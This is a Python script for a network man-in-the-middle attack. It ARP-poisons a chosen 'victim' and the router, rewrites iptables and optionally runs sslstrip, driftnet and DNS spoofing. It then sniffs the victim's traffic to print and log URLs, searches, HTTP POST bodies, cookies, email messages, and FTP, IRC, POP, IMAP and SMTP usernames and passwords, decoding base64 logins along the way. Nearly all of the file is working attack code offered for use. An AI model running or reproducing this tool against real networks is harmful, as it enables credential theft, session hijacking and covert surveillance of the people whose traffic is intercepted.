#!/usr/bin/python

'''
ADD A DICTIONARY OF LOGINS AND PASSWORDS AND ON CTRL-C HAVE IT THROW ALL THE USERNAMES, PASSWORDS, AND SERVER TO OUTPUT
MAKE DNSSPOOF RELIABLE
ADD wifi-monitor TO IT IF NO -ip OPTION EXISTS
'''

#from logging import getLogger
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
conf.verb=0
#Below is necessary to receive a response to the DHCP packets because we're sending to 255.255.255.255 but receiving from the IP of the DHCP server
conf.checkIPaddr=0
from sys import exit
from threading import Thread
import argparse
from os import geteuid, devnull
import signal
from base64 import b64decode
from subprocess import *
from twisted.internet import reactor
from twisted.internet.interfaces import IReadDescriptor
from twisted.internet.protocol import Protocol, Factory
import nfqueue

#Create the arguments
parser = argparse.ArgumentParser()
parser.add_argument("-u", "--urlspy", help="Show all URLs the victim is browsing minus URLs that end in .jpg, .png, .gif, .css, and .js to make the output much friendlier. Also truncates URLs at 150 characters. Use -v to print all URLs and without truncation.", action="store_true")
parser.add_argument("-ip", "--ipaddress", help="Enter IP address of victim and skip the arp ping at the beginning which would give you a list of possible targets.")
parser.add_argument("-d", "--driftnet", help="Open an xterm window with driftnet.", action="store_true")
parser.add_argument("-s", "--sslstrip", help="Open an xterm window with sslstrip.", action="store_true")
parser.add_argument("-v", "--verboseURL", help="Shows all URLs the victim visits but doesn't limit the URL to 150 characters like -u does.", action="store_true")
parser.add_argument("-dns", "--dnsspoof", help="Spoof DNS responses of a specific domain. Enter domain after this argument. This is a race condition with the router so this option is unreliable")
parser.add_argument("-p", "--post", help="Print unsecured HTTP POST loads, IMAP/POP/FTP/IRC/HTTP usernames/passwords and incoming/outgoing emails. Will also decode base64 encrypted POP/IMAP passwords for you.", action="store_true")
parser.add_argument("-w", "--write", help="Write to logfile intercept.log.txt in the current directory", action="store_true")
parser.add_argument("-i", "--interface", help="Choose the interface to use. Default is the first one that shows up in `ip route`.")
args = parser.parse_args()

#Console colors
W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
T  = '\033[93m' # tan

if args.write:
	logger = open('intercept.log.txt', 'w+')

class Spoof():
	def originalMAC(self, ip):
		# srp is for layer 2 packets with Ether layer, sr is for layer 3 packets like ARP and IP
		ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=5, retry=3)
		for s,r in ans:
			return r.sprintf("%Ether.src%")
	def poison(self, routerIP, victimIP, routerMAC, victimMAC):
		send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
		send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))
	def restore(self, routerIP, victimIP, routerMAC, victimMAC):
		send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=3)
		send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3)

class Parser():

	OheadersFound = []
	IheadersFound = []
	IMAPauth = 0
	IMAPdest = ''
	POPauth = 0
	POPdest = ''
	Cookies = []
	IRCnick = ''
	oldHTTPack = ''
	oldHTTPload = ''
	HTTPfragged = 0
	oldmailack = ''
	oldmailload = ''
	mailfragged = 0
	sentMsgs = []

	def start(self, payload):
		try:
			data = payload.get_data()
			pkt = IP(data)
		except:
			return

		if pkt.haslayer(Raw) and pkt.haslayer(TCP):
			dport = pkt[TCP].dport
			sport = pkt[TCP].sport
			ack = pkt[TCP].ack
			IP_dst = pkt[IP].dst
			IP_src = pkt[IP].src
			# Can't use repr if we're gzip deflating which will be necessary when code injection is added
			load = repr(pkt[Raw].load)[1:-1]
			mail_ports = [25, 26, 110, 143]
			# Catch fragmented packets only if they're being sent from the victim to a web server
			if dport in mail_ports or sport in mail_ports:
				self.mailspy(load, dport, sport, IP_dst, IP_src, mail_ports, ack)
			if dport == 6667 or sport == 6667:
				self.irc(load, dport, sport, IP_src)
			if dport == 21 or sport == 21:
				self.ftp(load, IP_dst, IP_src)
			if dport == 80 or sport == 80:
				self.URL(load, ack, dport, sport, pkt)

	def URL(self, load, ack, dport, sport, pkt):

		host = None
		get = None
		post = None
		url = None

		# Catch fragmented HTTP posts
		if dport == 80 and load != '':
			if ack == self.oldHTTPack:
				self.oldHTTPload = self.oldHTTPload+load
				load = self.oldHTTPload
				self.HTTPfragged = 1
			else:
				self.oldHTTPload = load
				self.oldHTTPack = ack
				self.HTTPfragged = 0

		try:
			headers, body = load.split(r"\r\n\r\n", 1)
		except:
			headers = load
			body = ''

		# Split the packet between headers and body and grab the URL from the headers
		# If you see any other login/pw variable names, tell me and I'll add em in here
		# As it stands now this has a moderately high false positive rate; I figured better to err on the site of more data than less and it's easy to tell what's a real hit vs false positive
		user_regex = '([Ee]mail|[Uu]ser|[Uu]sername|[Nn]ame|[Ll]ogin|[Ll]og|[Ll]ogin[Ii][Dd])=([^&|;]*)'
		pw_regex = '([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp]assw)=([^&|;]*)'
		header_lines = headers.split(r"\r\n")
		for l in header_lines:
			searchHost = re.search('[Hh]ost: ', l)
			searchGet = re.search('GET /', l)
			searchPost = re.search('POST /', l)
			if searchHost:
				host = l.split('Host: ')[1]
				if not host:
					host = l.split('host: ')[1]
			if searchGet:
				get = l.split('GET ')[1].split(' ')[0]
			if searchPost:
				post = l.split(' ')[1].split(' ')[0]
		if host and get:
			url = host+get
		if host and post:
			url = host+post

		# Catch search terms, print url, print post loads
		if url != None:
			#Print the URL
			if args.urlspy:
				d = ['.jpg', '.jpeg', '.gif', '.png', '.css', '.ico', '.js']
				if any(i in url for i in d):
					return
				if len(url) > 146:
					print '[*] '+url[:145]
				else:
					print '[*] '+url
			if args.verboseURL:
				print '[*] '+url

			# Catch search terms
			# As it stands now this has a moderately high false positive rate mostly due to the very simple ?s= and ?q= vars
			# I figured better to err on the site of more data than less and it's easy to tell the false positives from the real searches
			searched = re.search('((search|query|search\?q|\?s|&q|\?q|search\?p|keywords|command)=([^&][^&]*))', url)
			if searched:
				searched = searched.group(3)
				if 'select%20*%20from' in searched:
					pass
				else:
					searched = searched.replace('+', ' ').replace('%20', ' ').replace('%3F', '?').replace('%27', '\'').replace('%40', '@').replace('%24', '$').replace('%3A', ':').replace('%3D', '=').replace('%22', '\"').replace('%24', '$')
					print T+'[+] Searched '+W+host+T+': '+searched+W
					if args.write:
						logger.write('[+] Searched %s for: ' % host+searched+'\n')

			#Print POST load
			if post:
				if 'ocsp' in url:
					print B+'[+] POST: '+W+url
				elif body != '':
					try:
						urlsplit = url.split('/')
						url = urlsplit[0]+'/'+urlsplit[1]
					except:
						pass
					if self.HTTPfragged == 1:
						print B+'[+] Fragmented POST: '+W+url+B+" HTTP POST's combined load: "+body+W
					else:
						print B+'[+] POST: '+W+url+B+' HTTP POST load: '+body+W
					username = re.findall(user_regex, body)
					password = re.findall(pw_regex, body)
					self.user_pass(username, password)
					self.cookies(host, header_lines)

	host = None
	get = None
	post = None
	url = None

	def ftp(self, load, IP_dst, IP_src):
		load = load.replace(r"\r\n", "")
		if 'USER ' in load:
			print R+'[!] FTP '+load+' SERVER: '+IP_dst+W
			if args.write:
				logger.write('[!] FTP '+load+' SERVER: '+IP_dst+'\n')
		if 'PASS ' in load:
			print R+'[!] FTP '+load+' SERVER: '+IP_dst+W
			if args.write:
				logger.write('[!] FTP '+load+' SERVER: '+IP_dst+'\n')
		if 'authentication failed' in load:
			print R+'[*] FTP '+load+W
			if args.write:
				logger.write('[*] FTP '+load+'\n')

	def irc(self, load, dport, sport, IP_src):
			load = load.split(r"\r\n")
			if args.post:
				if IP_src == victimIP:
					if 'NICK ' in load[0]:
						self.IRCnick = load[0].split('NICK ')[1]
						server = load[1].replace('USER user user ', '').replace(' :user', '')
						print R+'[!] IRC username: '+self.IRCnick+' on '+server+W
						if args.write:
							logger.write('[!] IRC username: '+self.IRCnick+' on '+server+'\n')
					if 'NS IDENTIFY ' in load[0]:
						ircpass = load[0].split('NS IDENTIFY ')[1]
						print R+'[!] IRC password: '+ircpass+W
						if args.write:
							logger.write('[!] IRC password: '+ircpass+'\n')
					if 'JOIN ' in load[0]:
						join = load[0].split('JOIN ')[1]
						print C+'[+] IRC joined: '+W+join
						if args.write:
							logger.write('[+] IRC joined: '+join+'\n')
					if 'PART ' in load[0]:
						part = load[0].split('PART ')[1]
						print C+'[+] IRC left: '+W+part
						if args.write:
							logger.write('[+] IRC left: '+part+'\n')
					if 'QUIT ' in load[0]:
						quit = load[0].split('QUIT :')[1]
						print C+'[+] IRC quit: '+W+quit
						if args.write:
							logger.write('[+] IRC quit: '+quit+'\n')
				# Catch messages from the victim to an IRC channel
				if 'PRIVMSG ' in load[0]:
					if IP_src == victimIP:
						load = load[0].split('PRIVMSG ')[1]
						channel = load.split(' :', 1)[0]
						ircmsg = load.split(' :', 1)[1]
						if self.IRCnick != '':
							print C+'[+] IRC '+W+self.IRCnick+C+' to '+W+channel+C+': '+ircmsg+W
							if args.write:
								logger.write('[+] IRC '+self.IRCnick+' to '+channel+': '+ircmsg+'\n')
						else:
							print C+'[+] IRC msg to '+W+channel+C+': '+ircmsg+W
							if args.write:
								logger.write('[+] IRC msg to '+channel+':'+ircmsg+'\n')
					# Catch messages from others that tag the victim's nick
					elif self.IRCnick in load[0] and self.IRCnick != '':
						print 'self.ircnick is in load'
						sender_nick = load[0].split(':', 1)[1].split('!', 1)[0]
						try:
							load = load[0].split('PRIVMSG ')[1].split(' :', 1)
							channel = load[0]
							ircmsg = load[1]
							print C+'[+] IRC '+W+sender_nick+C+' to '+W+channel+C+': '+ircmsg[1:]+W
						except:
							return

	def cookies(self, host, header_lines):
		for x in header_lines:
			if 'Cookie:' in x:
				if x in self.Cookies:
					return
				elif 'safebrowsing.clients.google.com' in host:
					return
				else:
					self.Cookies.append(x)
				print P+'[+] Cookie found for '+W+host+P+' logged in intercept.log.txt'+W
				if args.write:
					logger.write('[+] Cookie found for'+host+':'+x.replace('Cookie: ', '')+'\n')

	def user_pass(self, username, password):
		if username:
			for u in username:
				print R+'[!] Username found: '+u[1]+W
				if args.write:
					logger.write('[!] Username: '+u[1]+'\n')
		if password:
			for p in password:
				if p[1] != '':
					print R+'[!] Password: '+p[1]+W
					if args.write:
						logger.write('[!] Password: '+p[1]+'\n')

	def mailspy(self, load, dport, sport, IP_dst, IP_src, mail_ports, ack):

		# Catch fragmented mail packets
		if dport in mail_ports or sport in mail_ports and load != '':
			if ack == self.oldmailack:
				self.oldmailload = self.oldmailload+load
				load = self.oldmailload
				self.mailfragged = 1
			else:
				self.oldmailload = load
				self.oldmailack = ack
				self.mailfragged = 0

		try:
			headers, body = load.split(r"\r\n\r\n", 1)
		except:
			headers = load
			body = ''
		header_lines = headers.split(r"\r\n")
		email_headers = ['Date: ', 'Subject: ', 'To: ', 'From: ']

#		Find passwords
		if dport in [25, 26, 110, 143]:
			self.passwords(IP_src, load, dport, IP_dst)
#		Find outgoing messages
		if dport == 26 or dport == 25:
			self.outgoing(load, body, header_lines, email_headers, IP_src)
#		Find incoming messages
		if sport in [110, 143]:
			self.incoming(headers, body, header_lines, email_headers, sport, dport)

	def passwords(self, IP_src, load, dport, IP_dst):
		# Get rid of all the hex at the beginning of the load
		load = load.replace(r'\r\n', '')
		if dport == 143 and IP_src == victimIP and len(load) > 15:
			if self.IMAPauth == 1 and self.IMAPdest == IP_dst:
				print R+'[!] IMAP user and pass found: '+load+W
				if args.write:
					logger.write('[!] IMAP user and pass found: '+load+'\n')
				self.decode(load, dport)
				self.IMAPauth = 0
				self.IMAPdest = ''
			if "authenticate plain" in load:
				self.IMAPauth = 1
				self.IMAPdest = IP_dst
		if dport == 110 and IP_src == victimIP:
			if self.POPauth == 1 and self.POPdest == IP_dst and len(load) > 10:
				print R+'[!] POP user and pass found: '+load+W
				if args.write:
					logger.write('[!] POP user and pass found: '+load+'\n')
				self.decode(load, dport)
				self.POPauth = 0
				self.POPdest = ''
			if 'AUTH PLAIN' in load:
				self.POPauth = 1
				self.POPdest = IP_dst
		if dport == 26:
			if 'AUTH PLAIN ' in load:
				print R+'[!] POP authentication found: '+load+W
				if args.write:
					logger.write('[!] POP authentication found: '+load+'\n')
				self.decode(load, dport)

	def outgoing(self, headers, body, header_lines, email_headers, IP_src):
		if 'Message-ID' in headers:
			for l in header_lines:
				# Don't double output sent messages
				if 'Message-ID' in l:
					if l in self.sentMsgs:
						return
					else:
						self.sentMsgs.append(l)
				for x in email_headers:
					if x in l:
						self.OheadersFound.append(l)
			if len(self.OheadersFound) > 3 and body != '':
				print O+'[!] OUTGOING MESSAGE'+W
				if args.write:
					logger.write('[!] OUTGOING MESSAGE\n')
				for x in self.OheadersFound:
					print O+'	',x+W
					if args.write:
						logger.write('	'+x+'\n')
				try:
					body = body.split(r'\r\n\x')[0]
					print O+'	Message:',body+W
				except:
					print O+'	[!] Could not parse message body'+W
					pass
				if args.write:
					logger.write('	Message:'+body+'\n')
		self.OheadersFound = []

	def incoming(self, headers, body, header_lines, email_headers, sport, dport):
		message = ''
		for l in header_lines:
			for x in email_headers:
				if x in l:
					self.IheadersFound.append(l)
		if len(self.IheadersFound) > 3 and body != '':
			if "BODY[TEXT]" not in body:
				try:
					beginning = body.split(r"\r\n", 1)[0]
					body1 = body.split(r"\r\n\r\n", 1)[1]
					message = body1.split(beginning)[0][:-8] #get rid of last \r\n\r\n
				except:
					return
			if message != '':
				print O+'[!] INCOMING MESSAGE'+W
				if args.write:
					logger.write('[!] INCOMING MESSAGE\n')
				for x in self.IheadersFound:
					print O+'	'+x+W
					if args.write:
						logger.write('	'+x+'\n')
				print O+'	Message: '+message+W
				if args.write:
					logger.write('	Message: '+message+'\n')
		self.IheadersFound = []

	def decode(self, load, dport):
		decoded = ''
		if dport == 25 or dport == 26:
			try:
				b64str = load.replace("AUTH PLAIN ", "").replace(r"\r\n", "")
				decoded = repr(b64decode(b64str))[1:-1].replace(r'\x00', ' ')
			except:
				pass
		else:
			try:
				b64str = load
				decoded = repr(b64decode(b64str))[1:-1].replace(r'\x00', ' ')
			except:
				pass
		# Test to see if decode worked
		if '@' in decoded:
			print R+'[!] Decoded:'+decoded+W
			if args.write:
				logger.write('[!] Decoded:'+decoded+'\n')

#Wrap the nfqueue object in an IReadDescriptor and run the process_pending function in a .doRead() of the twisted IReadDescriptor
class Queued(object):
	def __init__(self):
		self.q = nfqueue.queue()
		self.q.set_callback(Parser().start)
		self.q.fast_open(0, socket.AF_INET)
		self.q.set_queue_maxlen(5000)
		reactor.addReader(self)
		self.q.set_mode(nfqueue.NFQNL_COPY_PACKET)
		print '[*] Queue started; waiting for data\n'
	def fileno(self):
		return self.q.get_fd()
	def doRead(self):
		self.q.process_pending(20)
	def connectionLost(self, reason):
		reactor.removeReader(self)
	def logPrefix(self):
		return 'queued'

class Threads():

	def dnsspoof(self, victimIP):
		while 1:
			a=sniff(filter='port 53 and host %s' % victimIP, count=1, promisc=1)
			DNSpkt = a[0]
			if not DNSpkt.haslayer(DNSQR):
				continue
			if args.dnsspoof in DNSpkt.qd.qname:
				send(mkspoof(DNSpkt))
				print G + '[+] Spoofed:', DNSpkt.qd.qname + W

	def sslstrip(self, DN):
		print 'Redirecting traffic to port 10000 and starting sslstrip\n'
		os.system('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000')
#		os.system('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000')
		xterm = ['xterm', '-e', 'sslstrip', '-f', '-w', 'sslstrip.txt']
		Popen(xterm, stdout=PIPE, stderr=DN)

	def driftnet(self, interface, DN):
		xterm = ['xterm', '-e', 'driftnet', '-i', '%s' % interface]
		Popen(xterm, stdout=PIPE, stderr=DN)

	def start_threads(self, victimIP, interface, DN):#, victimMAC, routerMAC, routerIP):

		#start twisted reactor in thread
		rt = Thread(target=reactor.run, args=(False,)) #reactor must be started without signal handling since it's not in the main thread
		rt.daemon = True
		rt.start()

		if args.driftnet:
			dr = Thread(target=self.driftnet, args=(interface, DN))
			dr.daemon = True
			dr.start()
		if args.sslstrip:
			ssl = Thread(target=self.sslstrip, args=(DN,))
			ssl.daemon = True
			ssl.start()
		if args.dnsspoof:
			dns = Thread(target=self.dnsspoof, args=(victimIP,))
			dns.daemon = True
			dns.start()

#Print all the variables
def print_vars(interface, DHCPsrvr, dnsIP, local_domain, routerIP, victimIP):
	print "[*] Active interface: " + interface
	print "[*] DHCP server: " + DHCPsrvr
	print "[*] DNS server: " + dnsIP
	print "[*] Local domain: " + local_domain
	print "[*] Router IP: " + routerIP
	print "[*] Client IP: " + victimIP

#Enable IP forwarding and flush possibly conflicting iptables rules
def setup(DN, victimMAC):
	ipfwd = Popen(['cat', '/proc/sys/net/ipv4/ip_forward'], stdout=PIPE, stderr=DN)
	if ipfwd.communicate()[0] != '1\n':
		ipf = open('/proc/sys/net/ipv4/ip_forward', 'r+')
		ipf.write('1\n')
		ipf.close()
		print '[*] Enabled IP forwarding'
	os.system('iptables -F')
	os.system('iptables -X')
	os.system('iptables -t nat -F')
	os.system('iptables -t nat -X')
	print '[*] Flushed the firewall'
	# PREROUTING is a rule that will be needed to be added when code injection is added to this script
#	os.system('iptables -t nat -A PREROUTING -p tcp -s %s -j NFQUEUE' % victimIP)
#	os.system('iptables -t nat -A PREROUTING -p tcp -d %s -j NFQUEUE' % victimIP)
	# Just throw packets that are from and to the victim into the reactor
	os.system('iptables -A FORWARD -p tcp -s %s -m multiport --dports 21,26,53,80,110,143,6667 -j NFQUEUE' % victimIP)
	os.system('iptables -A FORWARD -p tcp -d %s -m multiport --dports 21,26,53,80,110,143,6667 -j NFQUEUE' % victimIP)
	os.system('iptables -A FORWARD -p tcp -s %s -m multiport --sports 21,26,53,80,110,143,6667 -j NFQUEUE' % victimIP)
	os.system('iptables -A FORWARD -p tcp -d %s -m multiport --sports 21,26,53,80,110,143,6667 -j NFQUEUE' % victimIP)
	print '[*] Forwarded traffic to the queue'

def main():
	#For use in URL_cb, mailspy respectively
	global victimMAC, victimIP

#	Cleans up if Ctrl-C is caught
	def signal_handler(signal, frame):
		print 'learing iptables, sending healing packets, and turning off IP forwarding...'
		if args.write:
			logger.close()
		if args.dnsspoof:
			q.unbind(socket.AF_INET)
			q.close()
		ipf = open('/proc/sys/net/ipv4/ip_forward', 'r+')
		ipf.write('0\n')
		ipf.close()
		if not dnsIP == routerIP:
			Spoof().restore(routerIP, dnsIP, routerMAC, dnsMAC)
			Spoof().restore(routerIP, dnsIP, routerMAC, dnsMAC)
		os.system('iptables -F')
		os.system('iptables -X')
		os.system('iptables -t nat -F')
		os.system('iptables -t nat -X')
		Spoof().restore(routerIP, victimIP, routerMAC, victimMAC)
		Spoof().restore(routerIP, victimIP, routerMAC, victimMAC)
		exit(0)
	signal.signal(signal.SIGINT, signal_handler)

	#Check if root
	if not geteuid()==0:
		exit("\nPlease run as root\n")

	DN = open(devnull, 'w')

	if args.ipaddress:
		victimIP = args.ipaddress
	else:
		ans,unans = arping(IPprefix+'*')
		for s,r in ans:
			ips = r.sprintf("%ARP.hwsrc% %ARP.psrc%")
			print ips
		victimIP = raw_input('\nType victim\'s IP: ')
		print ''

	#Find the gateway and interface
	ipr = Popen(['ip', 'route'], stdout=PIPE, stderr=DN)
	ipr = ipr.communicate()[0]
	routerRE = re.search('default via ((\d{2,3}\.\d{1,3}\.\d{1,4}\.)\d{1,3}) \w+ (\w[a-zA-Z0-9]\w[a-zA-Z0-9][0-9]?)', ipr)
	routerIP = routerRE.group(1)
	IPprefix = routerRE.group(2)
	if args.interface:
		interface = args.interface
	else:
		interface = routerRE.group(3)

	print "[*] Checking the DHCP and DNS server addresses..."
	# DHCP is a pain in the ass to craft
	dhcp = (Ether(dst='ff:ff:ff:ff:ff:ff')/
			IP(src="0.0.0.0",dst="255.255.255.255")/
			UDP(sport=68,dport=67)/
			BOOTP(chaddr='E3:2E:F4:DD:8R:9A')/
			DHCP(options=[("message-type","discover"),
				("param_req_list",
				chr(DHCPRevOptions["router"][0]),
				chr(DHCPRevOptions["domain"][0]),
				chr(DHCPRevOptions["server_id"][0]),
				chr(DHCPRevOptions["name_server"][0]),
				), "end"]))
	ans, unans = srp(dhcp, timeout=6, retry=1)
	if ans:
		for s,r in ans:
			DHCPopt = r[0][DHCP].options
			DHCPsrvr = r[0][IP].src
			for x in DHCPopt:
				if 'domain' in x:
					local_domain = x[1]
					pass
				else:
					local_domain = 'None'
				if 'name_server' in x:
					dnsIP = x[1]
	else:
		print "[!] No answer to DHCP packet sent to find the DNS server. Setting DNS and DHCP server to router IP."
		dnsIP = routerIP
		DHCPsrvr = routerIP
		local_domain = 'None'

	# Print the vars
	print_vars(interface, DHCPsrvr, dnsIP, local_domain, routerIP, victimIP)
	try:
		routerMAC = Spoof().originalMAC(routerIP)
		print "[*] Router MAC: " + routerMAC
	except:
		exit("[!] Could not get router MAC address")
	try:
		victimMAC = Spoof().originalMAC(victimIP)
		print "[*] Victim MAC: " + victimMAC
	except:
		exit("[!] Could not get victim MAC address")
	if dnsIP != routerIP:
		try:
			dnsMAC = Spoof().originalMAC(dnsIP)
			print "[*] DNS server MAC: " + dnsMAC
		except:
			print "[!] Could not get DNS server MAC address"
	if dnsIP == routerIP:
		dnsMAC = routerMAC

	setup(DN, victimMAC)
	Queued()
	th = Threads()
	th.start_threads(victimIP, interface, DN)

	while 1:
		#If DNS server is different from the router then we must spoof ourselves as the DNS server as well as the router
		if not dnsIP == routerIP:
			Spoof().poison(dnsIP, victimIP, dnsMAC, victimMAC)
		Spoof().poison(routerIP, victimIP, routerMAC, victimMAC)
		time.sleep(1.5)

if __name__ == "__main__":
	main()

#	except select.error  as ex:
#		if ex[0] == 4:
#			pass
#		else:
#			raise

#	Threads().start_threads(victimIP, interface, DN)#, victimMAC, routerMAC, routerIP)
#	while 1:
#		try:
#			#If DNS server is different from the router then we must spoof ourselves as the DNS server as well as the router
#			if not dnsIP == routerIP:
#				Spoof().poison(dnsIP, victimIP, dnsMAC, victimMAC)
#			Spoof().poison(routerIP, victimIP, routerMAC, victimMAC)
#			time.sleep(1.5)
#		except KeyboardInterrupt:
#			print 'learing iptables, sending healing packets, and turning off IP forwarding...'
#			if args.write:
#				logger.close()
#			if args.dnsspoof:
#				q.unbind(socket.AF_INET)
#				q.close()
#			ipf = open('/proc/sys/net/ipv4/ip_forward', 'r+')
#			ipf.write('0\n')
#			ipf.close()
#			if dnsIP != routerIP:
#				Spoof().restore(routerIP, dnsIP, routerMAC, dnsMAC)
#				Spoof().restore(routerIP, dnsIP, routerMAC, dnsMAC)
#			Popen(['iptables', '-F'], stdout=PIPE, stderr=DN)
#			Popen(['iptables', '-t', 'nat', '-F'], stdout=PIPE, stderr=DN)
#			Popen(['iptables', '-X'], stdout=PIPE, stderr=DN)
#			Popen(['iptables', '-t', 'nat', '-X'], stdout=PIPE, stderr=DN)
#			Spoof().restore(routerIP, victimIP, routerMAC, victimMAC)
#			Spoof().restore(routerIP, victimIP, routerMAC, victimMAC)
#			exit(0)
#	while 1:
#		continue
#	reactor.run()

#	while 1:
#		try:
#			#If DNS server is different from the router then we must spoof ourselves as the DNS server as well as the router
#			if not dnsIP == routerIP:
#				Spoof().poison(dnsIP, victimIP, dnsMAC, victimMAC)
#			Spoof().poison(routerIP, victimIP, routerMAC, victimMAC)
#			time.sleep(1.5)
#		except KeyboardInterrupt:
#			print 'learing iptables, sending healing packets, and turning off IP forwarding...'
#			if args.write:
#				logger.close()
#			if args.dnsspoof:
#				q.unbind(socket.AF_INET)
#				q.close()
#			ipf = open('/proc/sys/net/ipv4/ip_forward', 'r+')
#			ipf.write('0\n')
#			ipf.close()
#			if dnsIP != routerIP:
#				Spoof().restore(routerIP, dnsIP, routerMAC, dnsMAC)
#				Spoof().restore(routerIP, dnsIP, routerMAC, dnsMAC)
#			Popen(['iptables', '-F'], stdout=PIPE, stderr=DN)
#			Popen(['iptables', '-t', 'nat', '-F'], stdout=PIPE, stderr=DN)
#			Popen(['iptables', '-X'], stdout=PIPE, stderr=DN)
#			Popen(['iptables', '-t', 'nat', '-X'], stdout=PIPE, stderr=DN)
#			Spoof().restore(routerIP, victimIP, routerMAC, victimMAC)
#			Spoof().restore(routerIP, victimIP, routerMAC, victimMAC)
#			exit(0)


